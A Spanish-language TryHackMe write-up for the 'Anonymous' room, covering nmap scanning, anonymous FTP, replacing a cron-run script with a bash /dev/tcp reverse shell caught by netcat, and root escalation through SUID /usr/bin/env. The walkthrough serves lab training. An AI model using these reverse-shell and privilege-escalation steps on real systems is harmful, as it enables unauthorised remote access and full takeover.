---
title: Try Hack Me - Anonymous - Writeup
date: 2022-08-16 19:30:00 +0800
categories: ["Try Hack Me", Writeup]
tags: [thm, writeups]     # TAG names should always be lowercase
---

En esta guía vamos a trabajar con la máquina [Anonymous](https://tryhackme.com/room/anonymous) disponible en [THM](https://tryhackme.com), un CTF de dificultad media creado por [Nameless0ne](https://tryhackme.com/p/Nameless0ne) en el que pondremos en práctica técnicas de enumeración y escalado de privilegios entre otras curiosidades.

Dentro música.

## Inicio

> **Disclaimer:** algunos de estos primeros pasos que menciono a continuación son opcionales y solo reflejan mi modo de trabajar. Cada uno debería aplicar el propio.

Lo primero es conectar nuestra máquina local con THM via VPN para poder atacar desde nuestro equipo a la máquina del room.

```console
┌──(ewan67㉿kali)-[~]
└─$ sudo openvpn /home/ewan67/VPN_certs/THM_ewan67.ovpn
```

Iniciamos la máquina remota dando al botón&nbsp;&nbsp;<code class="language-plaintext highlighter-rouge" style="background-color:#73c686;color:#fff;">Start Machine</code>

Abrimos otro terminal en local, creamos la carpeta de trabajo, nos posicionamos en ella y creamos un fichero de notas en el que iremos apuntando información relevante a lo largo del proceso. En mi caso:

```console
┌──(ewan67㉿kali)-[~]
└─$ cd Cybersecurity/THM

┌──(ewan67㉿kali)-[~/Cybersecurity/THM]
└─$ mkdir Anonymous

┌──(ewan67㉿kali)-[~/Cybersecurity/THM]
└─$ cd Anonymous

┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Anonymous]
└─$ touch notas

┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Anonymous]
└─$ echo "Notas Anonymous" > notas

┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Anonymous]
└─$ cat notas
Notas Anonymous
```

## Reconocimiento & Enumeración

Empezamos enumerando el server con **nmap**.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Anonymous]
└─$ nmap -A 10.10.139.26 -oN nmap_output
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-16 23:23 CEST
Nmap scan report for 10.10.139.26
Host is up (0.074s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.18.xx.xx
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 0s, deviation: 1s, median: 0s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2022-08-16T21:23:24
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2022-08-16T21:23:24+00:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.20 seconds
```

Significado de las flags:

* `-A`&nbsp;: escaneo completo (ejecuta OS detection, version detection, script scanning y traceroute)
* `-oN`&nbsp;: imprime la salida en un fichero de texto con el nombre *nmap_output*

**nmap** nos cuenta que tenemos 4 puertos abiertos:

* *21/tcp*: con un servicio ftp soportado por *vsftpd 2.0.8 or later* y con *Anonymous FTP login allowed*
* *22/tcp*: con un servicio ssh soportado por *OpenSSH 7.6p1 Ubuntu*
* *139/tcp*: con un servicio netbios-ssn soportado por *Samba smbd 3.X - 4.X*
* *445/tcp*: con un servicio netbios-ssn soportado por *Samba smbd 4.7.6-Ubuntu*

Bien. Arrancamos por el *ftp* a ver qué nos encontramos.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Anonymous]
└─$ ftp 10.10.139.26
Connected to 10.10.139.26.
220 NamelessOne's FTP Server!
Name (10.10.139.26:ewan67): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||5755|)
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
226 Directory send OK.
ftp> cd scripts
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||20542|)
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         1204 Aug 16 21:30 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
ftp> get clean.sh
local: clean.sh remote: clean.sh
229 Entering Extended Passive Mode (|||48372|)
150 Opening BINARY mode data connection for clean.sh (314 bytes).
100% |*************************************************************************************************************************|   314      325.52 KiB/s    00:00 ETA
226 Transfer complete.
314 bytes received in 00:00 (6.01 KiB/s)
ftp> get removed_files.log
local: removed_files.log remote: removed_files.log
229 Entering Extended Passive Mode (|||65327|)
150 Opening BINARY mode data connection for removed_files.log (1204 bytes).
100% |*************************************************************************************************************************|  1204      913.58 KiB/s    00:00 ETA
226 Transfer complete.
1204 bytes received in 00:00 (27.84 KiB/s)
ftp> get to_do.txt
local: to_do.txt remote: to_do.txt
229 Entering Extended Passive Mode (|||16320|)
150 Opening BINARY mode data connection for to_do.txt (68 bytes).
100% |*************************************************************************************************************************|    68        1.16 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (0.67 KiB/s)
ftp> exit
221 Goodbye.
```

Hemos encontrado un directorio <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">scripts</code>&nbsp;, hemos entrado, listado su contenido y descargado con `get <file_name>` los ficheros que allí estaban a nuestro directorio de trabajo.

Los abrimos en local y les echamos un ojo.

* <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">clean.sh</code>&nbsp;: es un script para limpiar la carpeta */tmp* del servidor. Cada vez que se ejecuta revisa el número de ficheros en el directorio; si es 0, graba un mensaje en <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">removed_files.log</code>&nbsp;; si no es 0, elimina el fichero y graba un mensaje en <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">removed_files.log</code>.

* <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">removed_files.log</code>&nbsp;: es el fichero de logs del script anterior.

* <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">to_do.txt</code>&nbsp;: sin comentarios.

La cuestión aquí es saber quién ejecuta <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">clean.sh</code>&nbsp;y cuándo. Será una tarea programada ? De ser así, en el tiempo que llevamos elucubrando, se habrá vuelto a ejecutar ? Nos dará alguna información <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">removed_files.log</code>&nbsp;.

Para salir de dudas renombramos el <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">removed_files.log</code>&nbsp; que nos descargamos

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Anonymous]
└─$ mv removed_files.log removed_files2.log
```

Volvemos a descargarlo desde el FTP y contamos las lineas de cada uno

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Anonymous]
└─$ cat cat removed_files2.log | wc -l
28

┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Anonymous]
└─$ cat cat removed_files.log | wc -l
50
```

OK. El script <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">clean.sh</code>&nbsp; está asociado a una tarea programada. Si modificamos el contenido del fichero, lo subimos via FTP y esperamos a que se ejecute, estaremos ejecutando nuestro código en el servidor. Por ejemplo: una reverse shellcode para que se conecte a nuestro equipo.

Googleamos y encontramos lo que estamos buscando [aquí](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

```shell
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

Modificamos el contenido de <code class="language-plaintext highlighter-rouge" style="color:var(--filepath-text-color);">clean.sh</code>.

```shell
#!/bin/bash
bash -i >& /dev/tcp/<nuestra_IP>/4321 0>&1
```

Iniciamos un **netcat**

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Anonymous]
└─$ nc -lvnp 4321
```

Significado de las flags:

* `-l`&nbsp;: listen mode.
* `-v`&nbsp;: verbose.
* `-n`&nbsp;: solo IP numéricas, no DNS.
* `-p`&nbsp;: nro de puerto local.

Subimos nuestro fichero modificado al ftp

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Anonymous]
└─$ ftp 10.10.139.26
Connected to 10.10.139.26.
220 NamelessOne's FTP Server!
Name (10.10.139.26:ewan67): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd scripts
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||44503|)
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         3225 Aug 16 22:17 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
ftp> put clean.sh
local: clean.sh remote: clean.sh
229 Entering Extended Passive Mode (|||58560|)
150 Ok to send data.
100% |*************************************************************************************************************************|    55      274.03 KiB/s    00:00 ETA
226 Transfer complete.
55 bytes sent in 00:00 (0.73 KiB/s)
ftp> 
```

Y esperamos a que se ejecute .....

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Anonymous]
└─$ nc -lvnp 4321
listening on [any] 4321 ...
connect to [10.18.xx.xx] from (UNKNOWN) [10.10.139.26] 59858
bash: cannot set terminal process group (1529): Inappropriate ioctl for device
bash: no job control in this shell
namelessone@anonymous:~$ 
namelessone@anonymous:~$ ls -la
ls -la
total 60
drwxr-xr-x 6 namelessone namelessone 4096 May 14  2020 .
drwxr-xr-x 3 root        root        4096 May 11  2020 ..
lrwxrwxrwx 1 root        root           9 May 11  2020 .bash_history -> /dev/null
-rw-r--r-- 1 namelessone namelessone  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 namelessone namelessone 3771 Apr  4  2018 .bashrc
drwx------ 2 namelessone namelessone 4096 May 11  2020 .cache
drwx------ 3 namelessone namelessone 4096 May 11  2020 .gnupg
-rw------- 1 namelessone namelessone   36 May 12  2020 .lesshst
drwxrwxr-x 3 namelessone namelessone 4096 May 12  2020 .local
drwxr-xr-x 2 namelessone namelessone 4096 May 17  2020 pics
-rw-r--r-- 1 namelessone namelessone  807 Apr  4  2018 .profile
-rw-rw-r-- 1 namelessone namelessone   66 May 12  2020 .selected_editor
-rw-r--r-- 1 namelessone namelessone    0 May 12  2020 .sudo_as_admin_successful
-rw-r--r-- 1 namelessone namelessone   33 May 11  2020 user.txt
-rw------- 1 namelessone namelessone 7994 May 12  2020 .viminfo
-rw-rw-r-- 1 namelessone namelessone  215 May 13  2020 .wget-hsts
namelessone@anonymous:~$ cat user.txt
cat user.txt
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
namelessone@anonymous:~$ 
```

Bien, tenemos la flag de user. A por la de root.

## Escalado de privilegios

Tiramos por los clásicos y buscamos enumerar binarios con el bit SUID activado.

```console
┌──(ewan67㉿kali)-[~/Documents/Cybersecurity/THM/Anonymous]
└─$ namelessone@anonymous:~$ find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
< -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
-rwsr-xr-x 1 root root 40152 Oct 10  2019 /snap/core/8268/bin/mount
-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/8268/bin/ping
-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/8268/bin/ping6
-rwsr-xr-x 1 root root 40128 Mar 25  2019 /snap/core/8268/bin/su
-rwsr-xr-x 1 root root 27608 Oct 10  2019 /snap/core/8268/bin/umount
-rwsr-xr-x 1 root root 71824 Mar 25  2019 /snap/core/8268/usr/bin/chfn
-rwsr-xr-x 1 root root 40432 Mar 25  2019 /snap/core/8268/usr/bin/chsh
-rwsr-xr-x 1 root root 75304 Mar 25  2019 /snap/core/8268/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39904 Mar 25  2019 /snap/core/8268/usr/bin/newgrp
-rwsr-xr-x 1 root root 54256 Mar 25  2019 /snap/core/8268/usr/bin/passwd
-rwsr-xr-x 1 root root 136808 Oct 11  2019 /snap/core/8268/usr/bin/sudo
-rwsr-xr-- 1 root systemd-resolve 42992 Jun 10  2019 /snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 428240 Mar  4  2019 /snap/core/8268/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root root 106696 Dec  6  2019 /snap/core/8268/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root dip 394984 Jun 12  2018 /snap/core/8268/usr/sbin/pppd
-rwsr-xr-x 1 root root 40152 Jan 27  2020 /snap/core/9066/bin/mount
-rwsr-xr-x 1 root root 44168 May  7  2014 /snap/core/9066/bin/ping
-rwsr-xr-x 1 root root 44680 May  7  2014 /snap/core/9066/bin/ping6
-rwsr-xr-x 1 root root 40128 Mar 25  2019 /snap/core/9066/bin/su
-rwsr-xr-x 1 root root 27608 Jan 27  2020 /snap/core/9066/bin/umount
-rwsr-xr-x 1 root root 71824 Mar 25  2019 /snap/core/9066/usr/bin/chfn
-rwsr-xr-x 1 root root 40432 Mar 25  2019 /snap/core/9066/usr/bin/chsh
-rwsr-xr-x 1 root root 75304 Mar 25  2019 /snap/core/9066/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39904 Mar 25  2019 /snap/core/9066/usr/bin/newgrp
-rwsr-xr-x 1 root root 54256 Mar 25  2019 /snap/core/9066/usr/bin/passwd
-rwsr-xr-x 1 root root 136808 Jan 31  2020 /snap/core/9066/usr/bin/sudo
-rwsr-xr-- 1 root systemd-resolve 42992 Nov 29  2019 /snap/core/9066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 428240 Mar  4  2019 /snap/core/9066/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 110792 Apr 10  2020 /snap/core/9066/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root dip 394984 Feb 11  2020 /snap/core/9066/usr/sbin/pppd
-rwsr-xr-x 1 root root 26696 Mar  5  2020 /bin/umount
-rwsr-xr-x 1 root root 30800 Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 64424 Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root 43088 Mar  5  2020 /bin/mount
-rwsr-xr-x 1 root root 44664 Mar 22  2019 /bin/su
-rwsr-xr-x 1 root root 100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-- 1 root messagebus 42992 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-sr-x 1 root root 109432 Oct 30  2019 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 59640 Mar 22  2019 /usr/bin/passwd
-rwsr-xr-x 1 root root 35000 Jan 18  2018 /usr/bin/env
-rwsr-xr-x 1 root root 75824 Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 40344 Mar 22  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root root 44528 Mar 22  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 37136 Mar 22  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 76496 Mar 22  2019 /usr/bin/chfn
-rwsr-xr-x 1 root root 149080 Jan 31  2020 /usr/bin/sudo
-rwsr-xr-x 1 root root 18448 Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-sr-x 1 daemon daemon 51464 Feb 20  2018 /usr/bin/at
-rwsr-xr-x 1 root root 22520 Mar 27  2019 /usr/bin/pkexec
```

Tenemos `/usr/bin/env`&nbsp;&nbsp;a nuestra disposición. Nos vamos a [GTFOBins](https://gtfobins.github.io/), buscamos por *env* y le damos a la cajita que pone *suid*.

Leemos la entrada y nos quedamos con que lo que debemos ejecutar es:

```
/usr/bin/env /bin/sh -p
```

Vamos a ello.

```
namelessone@anonymous:~$ /usr/bin/env /bin/sh -p
/usr/bin/env /bin/sh -p
whoami
root
cd /root
ls
root.txt
cat root.txt
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

Bien, tenemos la flag de root.

Hasta aquí la guía para resolver el room. Espero que os haya resultado útil.

Saludos.